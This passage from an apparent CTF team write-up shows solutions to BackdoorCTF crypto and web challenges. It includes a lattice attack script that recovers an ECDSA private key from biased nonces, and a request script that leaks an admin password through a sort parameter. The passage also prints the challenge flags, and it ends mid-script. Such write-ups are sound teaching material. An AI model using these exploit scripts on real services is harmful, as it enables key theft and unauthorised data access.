            xa, xb, xc, xd <span style="color:#f92672">=</span> long_to_bytes(xl <span style="color:#f92672">^</span> processed_sub_keys[j])
            xn <span style="color:#f92672">=</span> (s_boxes[<span style="color:#ae81ff">0</span>][xa] <span style="color:#f92672">+</span> s_boxes[<span style="color:#ae81ff">1</span>][xb]) <span style="color:#f92672">%</span> modulus
            xn <span style="color:#f92672">=</span> s_boxes[<span style="color:#ae81ff">2</span>][xc] <span style="color:#f92672">^</span> xn
            f_out <span style="color:#f92672">=</span> (xn <span style="color:#f92672">+</span> s_boxes[<span style="color:#ae81ff">3</span>][xd]) <span style="color:#f92672">%</span> modulus
            
            xl, xr <span style="color:#f92672">=</span> new_xr, new_xl <span style="color:#f92672">^</span> f_out
            
        m <span style="color:#f92672">+=</span> long_to_bytes(xl) <span style="color:#f92672">+</span> long_to_bytes(xr)

    <span style="color:#66d9ef">return</span> m

flag <span style="color:#f92672">=</span> decrypt(processed_sub_keys,s_boxes,ct)
print(flag)
</code></pre></div><p>The flag is <code>flag{d0n't_u53_th3_m3r53nn3_r4nd0m_g3n3r4t0r_w1th0ut_c4ut10n_&lt;3}</code>.</p>
<h3 id="random-nonsense-4-solves">Random Nonsense (4 solves)<a hidden class="anchor" aria-hidden="true" href="#random-nonsense-4-solves">#</a></h3>
<p><em>Solved by Mystiz</em></p>
<!-- raw HTML omitted -->
<h4 id="challenge-summary">Challenge Summary<a hidden class="anchor" aria-hidden="true" href="#challenge-summary">#</a></h4>
<p>We are given a server that signs up to 49 messages (except the message $m_0$) with a secret key, $d$, with ECDSA over the curve P384. The goal is to forge a signature for the message $m_0$.</p>
<p>The <code>sign</code> function specifies on how the signature is created from the message <code>msg</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(m: bytes) <span style="color:#f92672">-&gt;</span> int:
    m <span style="color:#f92672">=</span> m<span style="color:#f92672">.</span>decode()
    enc_arr <span style="color:#f92672">=</span> range(<span style="color:#ae81ff">1</span>, counter <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
    <span style="color:#66d9ef">if</span> len(list(set(m))) <span style="color:#f92672">==</span> counter:
        s <span style="color:#f92672">=</span> set()
        enc_arr <span style="color:#f92672">=</span> []
        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> m:
            <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> s:
                <span style="color:#66d9ef">continue</span>
            enc_arr<span style="color:#f92672">.</span>append(MAP[x])
            s<span style="color:#f92672">.</span>add(x)
    <span style="color:#66d9ef">return</span> sum([(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">**</span>i<span style="color:#f92672">*</span>x <span style="color:#66d9ef">for</span> i, x <span style="color:#f92672">in</span> enumerate(enc_arr)])<span style="color:#f92672">%</span>n

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sign</span>(msg, d):
    x <span style="color:#f92672">=</span> int(hashlib<span style="color:#f92672">.</span>sha256(long_to_bytes(encode(msg) <span style="color:#f92672">&amp;</span> random<span style="color:#f92672">.</span>randrange(<span style="color:#ae81ff">1</span>, n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)))<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">50</span>
    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
        k <span style="color:#f92672">=</span> (random<span style="color:#f92672">.</span>getrandbits(<span style="color:#ae81ff">320</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">50</span>) <span style="color:#f92672">+</span> x
        r <span style="color:#f92672">=</span> (k<span style="color:#f92672">*</span>G)<span style="color:#f92672">.</span>x()
        <span style="color:#66d9ef">if</span> r <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">break</span>

    m <span style="color:#f92672">=</span> int(hashlib<span style="color:#f92672">.</span>sha256(msg)<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)
    s <span style="color:#f92672">=</span> (inv(k)<span style="color:#f92672">*</span>(m <span style="color:#f92672">+</span> r<span style="color:#f92672">*</span>d)) <span style="color:#f92672">%</span> n
    <span style="color:#66d9ef">return</span> (int(r), int(s)) 
</code></pre></div><h4 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h4>
<p>I spent some time understanding the <code>encode</code> function, but then I noticed the range of <code>k</code>: The size of <code>k</code> is 370 bits long&hellip; It is smaller than 384! Since <code>k</code> is relatively small, we can use LLL to recover the secret key <code>d</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
<span style="color:#75715e"># -*- coding: UTF-8 -*-</span>

<span style="color:#f92672">import</span> os
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">import</span> ecdsa

<span style="color:#f92672">from</span> ctfools <span style="color:#f92672">import</span> Challenge <span style="color:#66d9ef">as</span> BaseChallenge

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sign</span>(msg, d):
    Curve <span style="color:#f92672">=</span> ecdsa<span style="color:#f92672">.</span>NIST384p
    G <span style="color:#f92672">=</span> Curve<span style="color:#f92672">.</span>generator
    n <span style="color:#f92672">=</span> int(Curve<span style="color:#f92672">.</span>order)
 
    k <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>

    r <span style="color:#f92672">=</span> int((k<span style="color:#f92672">*</span>G)<span style="color:#f92672">.</span>x())
    m <span style="color:#f92672">=</span> int(hashlib<span style="color:#f92672">.</span>sha256(msg)<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)
    s <span style="color:#f92672">=</span> (pow(k, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, n)<span style="color:#f92672">*</span>(m <span style="color:#f92672">+</span> r<span style="color:#f92672">*</span>d)) <span style="color:#f92672">%</span> n
    <span style="color:#66d9ef">return</span> (int(r), int(s)) 

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Challenge</span>(BaseChallenge):
    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
        super()<span style="color:#f92672">.</span>__init__(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
        <span style="color:#75715e"># self.r.recvline() # Example if you gonna skip one line</span>

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sign_send</span>(self, m):
        self<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;S&#39;</span>)
        self<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>sendline(m)
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sign_recv</span>(self):
        self<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;r=&#39;</span>)
        r <span style="color:#f92672">=</span> int(self<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>])
        self<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;s=&#39;</span>)
        s <span style="color:#f92672">=</span> int(self<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode())
        <span style="color:#66d9ef">return</span> r, s

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    _local <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;local&#39;</span> <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>environ
    _log <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;log&#39;</span> <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>environ

    r <span style="color:#f92672">=</span> Challenge(
        conn<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;nc hack.backdoor.infoseciitr.in 17701&#39;</span>,
        proc<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;python3&#39;</span>, <span style="color:#e6db74">&#39;challenge/chall.py&#39;</span>],
        local<span style="color:#f92672">=</span>_local,
        log<span style="color:#f92672">=</span>_log)

    Curve <span style="color:#f92672">=</span> ecdsa<span style="color:#f92672">.</span>NIST384p
    q <span style="color:#f92672">=</span> Curve<span style="color:#f92672">.</span>order

    m <span style="color:#f92672">=</span> <span style="color:#ae81ff">49</span>

    A <span style="color:#f92672">=</span> Matrix(ZZ, <span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>m<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)

    weights <span style="color:#f92672">=</span> [q <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(m)] <span style="color:#f92672">+</span> [q, <span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> [<span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">14</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(m)]

    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Signing...&#39;</span>)
    msgs <span style="color:#f92672">=</span> [os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode() <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(m)]

    <span style="color:#66d9ef">for</span> msg <span style="color:#f92672">in</span> msgs:
        r<span style="color:#f92672">.</span>_sign_send(msg)

    <span style="color:#66d9ef">for</span> i, msg <span style="color:#f92672">in</span> enumerate(msgs):
        h <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(hashlib<span style="color:#f92672">.</span>sha256(msg)<span style="color:#f92672">.</span>digest(), <span style="color:#e6db74">&#39;big&#39;</span>)
        _r, _s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>_sign_recv()

        A[<span style="color:#ae81ff">0</span>,     i  ] <span style="color:#f92672">=</span> h
        A[<span style="color:#ae81ff">1</span>,     i  ] <span style="color:#f92672">=</span> _r
        A[<span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>i,   i  ] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>_s
        A[<span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>m<span style="color:#f92672">+</span>i, i  ] <span style="color:#f92672">=</span> q

    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(m<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>):
        A[i,     m<span style="color:#f92672">+</span>i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>

    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Computing LLL...&#39;</span>)
    Q <span style="color:#f92672">=</span> diagonal_matrix(weights)
    A <span style="color:#f92672">*=</span> Q
    A <span style="color:#f92672">=</span> A<span style="color:#f92672">.</span>LLL()
    A <span style="color:#f92672">/=</span> Q

    <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> A:
        <span style="color:#66d9ef">if</span> row[m] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>: row <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>row
        <span style="color:#66d9ef">if</span> row[m] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">continue</span>
        <span style="color:#66d9ef">if</span> min(row[:m]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">continue</span>
        <span style="color:#66d9ef">if</span> max(row[:m]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">continue</span>
        d <span style="color:#f92672">=</span> int(row[m<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>])
        <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">assert</span> <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;no good!&#39;</span>

    _r, _s <span style="color:#f92672">=</span> sign(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Sign me to get the flag&#39;</span>, d)
    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>_r <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>_s <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)

    r<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;V&#39;</span>)
    r<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Sign me to get the flag&#39;</span>)
    r<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>sendline(str(_r)<span style="color:#f92672">.</span>encode())
    r<span style="color:#f92672">.</span>r<span style="color:#f92672">.</span>sendline(str(_s)<span style="color:#f92672">.</span>encode())

    r<span style="color:#f92672">.</span>interactive()

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    main()
<span style="color:#75715e"># flag{y0u_g07_7h3_h1dd3n_p3rmu7a710n_pR0bL3m}</span>
</code></pre></div><h3 id="morph-2-solves">Morph (2 solves)<a hidden class="anchor" aria-hidden="true" href="#morph-2-solves">#</a></h3>
<p><em>Solved by Mystiz</em></p>
<h4 id="challenge-description">Challenge Description<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h4>
<p>Let $M$ be a square matrix. Define $M^{[n]}$ by</p>
<p>$$M^{[n]} = {H_1}^{n-1} \cdot M \cdot {H_2}^{n-1} + {H_1}^{n-2} \cdot M \cdot {H_2}^{n-2} + &hellip; + M.$$</p>
<p>We are given a prime $p$ and $4 \times 4$ matrices $H_1$, $H_2$, $M$, $A$ and $B$ such that</p>
<ul>
<li>$H_1$ and $H_2$ are singular,</li>
<li>$A = M^{[\alpha]}\ \text{mod} \ p$ and $B = M^{[\beta]}\ \text{mod}\ p$ for some unknowns $\alpha$ and $\beta$.</li>
</ul>
<p>The goal is to find $S := M^{[\alpha + \beta]}\ \text{mod}\ p$.</p>
<h4 id="solution-1">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-1">#</a></h4>
<p>We tried multiple approaches but in vain. For instance we</p>
<ul>
<li>expressed everything mathematically and see if there is something fishy,</li>
<li>tried to see if the discrete log can be easily computed, or even</li>
<li>predicted the number generated by Python&rsquo;s <code>random</code>&hellip;</li>
</ul>
<p>Eventually, we came across to the paper <a href="http://lab.algonics.net/temp/mathcrypt/pdfs/battarbee.pdf">Cryptanalysis of Semidirect Product Key Exchange Using Matrices Over Non-Commutative Rings</a>. The challenge is implementing the key exchange mentioned in the paper, which is shown to be fragile. Therefore we followed the steps given by section 3 and got the flag: <code>flag{y0u_c4n_M$K#_7h3_74bl3s_7Urn}</code>.</p>
<h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
<h3 id="s3ksu4l_inj3c710n-10-solves">S3KSU4L_INJ3C710N (10 solves)<a hidden class="anchor" aria-hidden="true" href="#s3ksu4l_inj3c710n-10-solves">#</a></h3>
<p><em>Solved by Viky</em></p>
<h4 id="challenge-description-1">Challenge description<a hidden class="anchor" aria-hidden="true" href="#challenge-description-1">#</a></h4>
<p><img src="/images/2022-12-24-backdoorctf/injection-1.png" alt=""></p>
<p>The challenge provides an web application with its source code. Once accessing the site URL, you can see the site returning a list of users.</p>
<p><img src="/images/2022-12-24-backdoorctf/injection-2.png" alt=""></p>
<h4 id="source-code">Source code<a hidden class="anchor" aria-hidden="true" href="#source-code">#</a></h4>
<p>Let us take look on what this application does from the provided source code.
The following is the API which was used to retrieve users from database.</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">@app.route('/api/data')
def data():
    query = User.query
    total_filtered = query.count()
    col_index = request.args.get('order[0][column]')
    flag=1
    if col_index is None:
        col_index=0
        flag=0
    col_name = request.args.get(f'columns[{col_index}][data]')
    users=[user.to_dict() for user in query]
    descending = request.args.get(f'order[0][dir]') == 'desc'
    try:
        if descending:
            users=sorted(users,key=lambda x:helper(x,col_name),reverse=True)
        else :
            users=sorted(users,key=lambda x:helper(x,col_name),reverse=False)
    except:
        pass
    start = request.args.get('start', type=int)
    length = request.args.get('length', type=int)
    users=users[start:start+length]
    for user in users:
        del user['password']
    if flag==0:
        random.shuffle(users)
    return {
        'data': users,
        'recordsFiltered': total_filtered,
        'recordsTotal': 500,
        'draw': request.args.get('draw', type=int),
    }
</code></pre><p>As you can see there are only a few meaningful parameters</p>
<ul>
<li><code>order[0][column]</code>
<ul>
<li>Assignes the user provided value to the variable <code>col_index</code></li>
</ul>
</li>
<li><code>columns[{col_index}][data]</code>
<ul>
<li>Based on the user provided value, <code>col_name</code> would be used to sort the <code>users</code> via <code>helper</code> function</li>
</ul>
</li>
<li><code>order[0][dir]</code>
<ul>
<li>Determines if the returned users are sorted in ascending or descending order</li>
</ul>
</li>
<li><code>start</code>
<ul>
<li>Detemines the starting index of the returned <code>users</code> list</li>
</ul>
</li>
<li><code>length</code>
<ul>
<li>Determines the length of the returned <code>users</code> list</li>
</ul>
</li>
<li><code>draw</code>
<ul>
<li>Determines the value of <code>draw</code>. Not that useful.</li>
</ul>
</li>
</ul>
<p>This implies we can control how many users being returned from the API and how it could be sorted.</p>
<p>We should also check how <code>users</code> are defined. The following code are ran on server start.</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">faker=Faker()
hexc=[]
for i in range(16):
    hexc.append(hex(i)[2:])
for i in range(50):
    random.shuffle(hexc)
passwords=[]
lucky=random.randint(100,400)
f=open('users.txt','w')
for i in range(500):
    random.shuffle(hexc)
    passwords.append(&quot;&quot;.join(hexc))
    name=faker.name()
    phone=faker.phone_number()
    if phone[0]!='+':
        phone='+'+phone
    if i == lucky:
        name='Adm1n_h3r3_UwU'
    f.write(name+'||'+passwords[i]+'||'+faker.address().replace('\n',', ')+'||'+phone+'||'+faker.email())
    f.write('\n')
f.close()
</code></pre><p>Basically this code provides the following information</p>
<ul>
<li>The <code>hexc</code> variable is a list of 16 characters <code>['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']</code></li>
<li>There are 500 users with one random user will be assigned a special name <code>Adm1n_h3r3_UwU</code>.</li>
<li>A password will be created for each user by shuffling the <code>hexc</code> variable with function <code>random.shuffle</code>, so we can tell the password will be of length 16, with 16! of possible permutation</li>
</ul>
<h4 id="challenge-analysis">Challenge Analysis<a hidden class="anchor" aria-hidden="true" href="#challenge-analysis">#</a></h4>
<p>So after all that work, what is the flag for this challenge? What? You don&rsquo;t have any idea? Well, it was quite obvious to see that the password of that special user is the flag of this challenge.</p>
<p><img src="/images/2022-12-24-backdoorctf/injection-3.png" alt=""></p>
<p>The password is removed before returning user data from <code>/api/data</code>. Is there a way to obtain the password of the user <code>Adm1n_h3r3_UwU</code>?</p>
<p>Basically what we could do is that we can query the users and sort them with any column, including <code>password</code>. However, a password may have 16! permutation, thus it is not that helpful if we sort users with the entire password. We can do better.
Let us have a look how <code>help</code> was defined.</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">def helper(data, prop, is_data=False):
    pr =  prop.split('.')
    pr1= prop.split('.')
    count=0
    for p in pr:
        if count == 2:
            return None
        count+=1
        pr1=pr1[1:]
        nextprop = '.'.join(pr1)
        if hasattr(data, p):
            if nextprop=='':
                return getattr(data, p)
            return helper(getattr(data, p), nextprop, True)

...snip...
        elif type(data) == list or type(data) == tuple or type(data)==str:
            try:
                if nextprop=='':
                    return data[int(p)]
                return helper(data[int(p)], nextprop, True)
            except (ValueError, TypeError, IndexError):
                return None
        else:
            return None

    if is_data:
        return data
    else:
        return None
</code></pre><p>What does this do? Let us ask ChatGPT.</p>
<pre tabindex="0"><code class="language-!" data-lang="!">This is a recursive function that takes in a data object, a property string, and an optional boolean flag and returns the value at the specified property of the data object if it exists, or None if it does not exist. The property string can include dots to indicate nested properties and the function will traverse the data object accordingly. The optional boolean flag is used to indicate whether the data object being passed to the function is the original data object or a nested data object.
</code></pre><p>This means we can sort users by <code>user.password.__repr__</code> by setting the GET parameter <code>columns[{col_index}][data]</code> to <code>password.__repr__</code>. Is this useful? Not really. However, what happens if you provide an integer? What if we pass <code>password.0</code>?</p>
<pre tabindex="0"><code class="language-python!" data-lang="python!">        elif type(data) == list or type(data) == tuple or type(data)==str:
            try:
                if nextprop=='':
                    return data[int(p)]
                return helper(data[int(p)], nextprop, True)
</code></pre><p><code>user.password</code> is a string and <code>0</code> is the last property, <code>nextprop</code> will be <code>''</code>, then <code>data[int(p)]</code> would be returned. This means<code>user.password.0</code> will be interperted as<code>user.password[0]</code>. This implies we can sort users by each character of the password. With this information we can sort the users by each index of the password and guess each character.</p>
<h4 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h4>
<p>First attempt, assuming that the password character set is evenly distributed, divide the users into 16 chunks and guess the admin password by checking which chunk the admin is at. Gets <code>a479ce51ec083f27</code>. This was obviously wrong as there are duplicated characters.</p>
<p>Second attempt, I tried to sort the index of admin in user lists of each password index in ascending order and assign the smallest admin index to the first character in the sorted<code>hexc</code> at the corresponding password index and so on. This yeilds <code>a479be51dc083f26</code> which is also wrong, but is actually quite close to the correct password.</p>
<p>Third attempt, thanks to <a href="https://twitter.com/mystiz613">mystiz613</a> for observing the in-place property of the function <a href="https://docs.python.org/3/howto/sorting.html">sorted()</a>, we can know the exact character of each index of the password by observing index of users in ascending and descending orders.
In particular, the users are sorted in-place which would occupy the same storage as the original ones when there is a tie as the following code implied.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">try</span>:
        <span style="color:#66d9ef">if</span> descending:
            users<span style="color:#f92672">=</span>sorted(users,key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> x:helper(x,col_name),reverse<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
        <span style="color:#66d9ef">else</span> :
            users<span style="color:#f92672">=</span>sorted(users,key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> x:helper(x,col_name),reverse<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</code></pre></div><p>Let us take a moment to appreciate the following screenshot from mystiz which illustrate the in-place property of users sorted ascendingly and descendingly.</p>
<p><img src="/images/2022-12-24-backdoorctf/injection-4.png" alt=""></p>
<p>So basically we can determine the different chunks of users by comparing the list of sorted users from ascending order and descending order.</p>
<p>Consider the following list sorted by the first character of password ascendingly.</p>
<pre tabindex="0"><code>[
    {&quot;user&quot;:2,&quot;password&quot;:&quot;0213&quot;},
    {&quot;user&quot;:7,&quot;password&quot;:&quot;0132&quot;},
    {&quot;user&quot;:1,&quot;password&quot;:&quot;1230&quot;},
    {&quot;user&quot;:4,&quot;password&quot;:&quot;1203&quot;},
    {&quot;user&quot;:6,&quot;password&quot;:&quot;2103&quot;},
    {&quot;user&quot;:5,&quot;password&quot;:&quot;2130&quot;},
    {&quot;user&quot;:3,&quot;password&quot;:&quot;3120&quot;},
    {&quot;user&quot;:8,&quot;password&quot;:&quot;3102&quot;},
]
</code></pre><p>If we sorted the first character of password descendingly, we would get the following.</p>
<pre tabindex="0"><code>[
    {&quot;user&quot;:3,&quot;password&quot;:&quot;3120&quot;},
    {&quot;user&quot;:8,&quot;password&quot;:&quot;3102&quot;},
    {&quot;user&quot;:6,&quot;password&quot;:&quot;2103&quot;},
    {&quot;user&quot;:5,&quot;password&quot;:&quot;2130&quot;},
    {&quot;user&quot;:1,&quot;password&quot;:&quot;1230&quot;},
    {&quot;user&quot;:4,&quot;password&quot;:&quot;1203&quot;},
    {&quot;user&quot;:2,&quot;password&quot;:&quot;0213&quot;},
    {&quot;user&quot;:7,&quot;password&quot;:&quot;0132&quot;},

]
</code></pre><p>In our simplfied scenario, password is 4 character long with range from 0 to 3. In a large enough sample size (16 characters randomly distributed among 500 users), we can say it is very likely that every single character will appear at each index of the password.
There are some facts that we can tell from the two list:</p>
<ol>
<li>user 2 password starts with 0 as it is the first element of the ascending list</li>
<li>user 7 password starts with 0 as it is the last element of the decending list</li>
<li>Any users between user 2 and user 7 have password starts as 0 as the list is sorted</li>
<li>We can deduce user 1 password starts with 1 as it is right after user 7 in the ascending list.</li>
<li>We can deduce user 4 password starts with 1 as it is right before user 2 in the decending list.</li>
<li>And so on until reaching the end of the list</li>
</ol>
<p>We can tell what is the corresponding password character for users from their corresponding index in the user list. After we have the mapping, we just have to find the index of user <code>Adm1n_h3r3_UwU</code> and determine the character of password at a particular index. Repeat the query from <code>password.0</code> to <code>password.15</code> to obtain the entire password of user <code>Adm1n_h3r3_UwU</code></p>
<h4 id="solve-script">Solve script<a hidden class="anchor" aria-hidden="true" href="#solve-script">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://hack.backdoor.infoseciitr.in:16052/api/data&#34;</span>
query_params <span style="color:#f92672">=</span> {
    <span style="color:#e6db74">&#34;columns[0][data]&#34;</span>: <span style="color:#e6db74">&#34;password.2&#34;</span>,
    <span style="color:#e6db74">&#34;columns[0][passwords]&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
    <span style="color:#e6db74">&#34;order[0][column]&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>,
    <span style="color:#e6db74">&#34;order[0][dir]&#34;</span>: <span style="color:#e6db74">&#34;AAA&#34;</span>,
    <span style="color:#e6db74">&#34;start&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>,
    <span style="color:#e6db74">&#34;length&#34;</span>: <span style="color:#e6db74">&#34;500&#34;</span>
}
password_charset <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;d&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;f&#39;</span>]
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_index_from_list</span>(lst, name):
    <span style="color:#66d9ef">for</span> i, v <span style="color:#f92672">in</span> enumerate(lst):
        <span style="color:#66d9ef">if</span>(v[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">==</span> name):
            <span style="color:#66d9ef">return</span> i
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
idxs <span style="color:#f92672">=</span> []
temp_map <span style="color:#f92672">=</span> {}
password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
    query_params[<span style="color:#e6db74">&#34;columns[0][data]&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;password.</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
    query_params[<span style="color:#e6db74">&#34;order[0][dir]&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;asce&#34;</span>
    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>query_params, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)

    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
        data <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;data&#34;</span>]
        admin_index <span style="color:#f92672">=</span> next((index <span style="color:#66d9ef">for</span> (index, d) <span style="color:#f92672">in</span> enumerate(data) <span style="color:#66d9ef">if</span> d[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Adm1n_h3r3_UwU&#34;</span>), <span style="color:#66d9ef">None</span>)
    <span style="color:#66d9ef">else</span>:
